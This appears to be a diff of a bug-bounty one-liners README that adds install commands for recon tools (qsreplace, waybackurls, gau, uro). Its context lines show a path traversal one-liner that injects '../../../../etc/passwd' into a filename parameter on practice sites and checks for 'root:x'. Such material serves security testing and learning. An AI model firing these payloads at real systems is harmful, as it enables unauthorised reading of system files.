@@ -37,6 +37,32 @@ echo http://testphp.vulnweb.com/ | waybackurls | grep "=" | egrep -iv ".(jpg|jpe
 echo "https://0aa9003403a40852c028b1270079009b.web-security-academy.net/image?filename=" | qsreplace "../../../../etc/passwd" | findit -c "root:x"
 ```
 
-
 ![image](https://user-images.githubusercontent.com/5285547/178974785-cbbab50c-bd6e-4a4e-ae7d-822ba3ca46f6.png)
+---
+
+## Bug Tools (easy install) 
+
+qsreplace
+
+```
+go install github.com/tomnomnom/qsreplace@latest
+```
+
+waybackurls
+
+```
+go install github.com/tomnomnom/waybackurls@latest
+```
+
+gau
+
+```
+go install github.com/lc/gau/v2/cmd/gau@latest
+```
+
+uro 
+
+```
+pip3 install uro
+```
 
